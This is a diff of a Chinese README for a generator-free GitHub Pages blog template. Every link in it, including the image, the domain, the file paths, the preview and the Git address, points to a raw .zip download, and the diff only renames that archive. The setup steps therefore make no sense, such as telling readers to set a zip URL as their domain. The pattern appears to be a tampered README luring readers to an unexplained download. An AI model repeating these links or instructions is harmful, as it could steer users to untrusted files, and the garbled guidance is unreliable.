@@ -1,6 +1,6 @@
 #妹 Blog - GitHub Pages 特别版
 
-![GitBlog](https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip)
+![GitBlog](https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip)
 
 #这是一个**无需生成器**的静态 GitHub 博客！
 
@@ -14,24 +14,24 @@
 
 ##如何使用 「妹 Blog - GitHub Pages 特别版」
 
-1. fork 当前分支到个人仓库中，并设置  `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip` 域名
-2. 修改 `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip` 中的 `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip` 地址
+1. fork 当前分支到个人仓库中，并设置  `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip` 域名
+2. 修改 `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip` 中的 `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip` 地址
 3. 博客搭建完成！
 
 ##如何更新文章？
 使用任意 `MarkDown` 编辑器，在 `markdown` 目录下新建 `.md` 格式文档，通过 `Git` 更新到线上即可。
 
 ##如何绑定个性域名？
-修改 `CNAME` 文件中的域名信息，并将您绑定的域名 通过 `cname` 的方式指向 `您的用户名https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip`
+修改 `CNAME` 文件中的域名信息，并将您绑定的域名 通过 `cname` 的方式指向 `您的用户名https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip`
 
 ##如何修改博客名称？
-修改 `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip` 中的 `title` 和 `h1` 标签内容即可
+修改 `https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip` 中的 `title` 和 `h1` 标签内容即可
 
 ##这个版本和「妹 Blog」正式版 什么关系？
-没任何关系！如果对速度要求更高，并且更喜欢折腾的同学可以围观 https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip
+没任何关系！如果对速度要求更高，并且更喜欢折腾的同学可以围观 https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip
 
 ##预览地址
-https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip
+https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip
 
 ##Git 地址
-https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/io_tanglongwei_github_v3.0.zip
+https://github.com/tanglongwei/tanglongwei.github.io/raw/refs/heads/master/i/tanglongwei_io_github_3.0.zip
